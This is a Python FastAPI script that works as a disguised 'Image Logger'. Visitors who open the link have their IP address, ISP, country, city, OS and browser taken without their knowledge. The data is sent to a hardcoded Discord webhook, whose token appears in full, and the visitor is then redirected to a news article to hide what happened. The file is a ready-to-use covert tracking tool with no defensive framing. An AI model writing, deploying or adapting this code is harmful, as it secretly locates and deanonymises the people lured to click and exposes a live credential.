from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, RedirectResponse
import httpagentparser, base64, requests

app = FastAPI()

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397612208783097956/sdw4QDkjUDWaqwYvYiF2bq2lGpMdQlMsubvT54rP2zk01hOCp8FcnDqlk46SFYf-86K3"
REDIRECT_URL = "https://jo24.net/article/539190"

@app.get("/", response_class=HTMLResponse)
async def log_and_redirect(request: Request):
    ip = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown")

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        os, browser = httpagentparser.simple_detect(user_agent)

        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "IP Logged",
                "color": 0x00FFFF,
                "description": f"""
**IP:** `{ip}`
**Provider:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**OS:** `{os}`
**Browser:** `{browser}`
**User Agent:** `{user_agent}`
                """
            }]
        }
        requests.post(WEBHOOK_URL, json=embed)
    except Exception as e:
        print("Error sending to webhook:", e)

    return RedirectResponse(url=REDIRECT_URL)
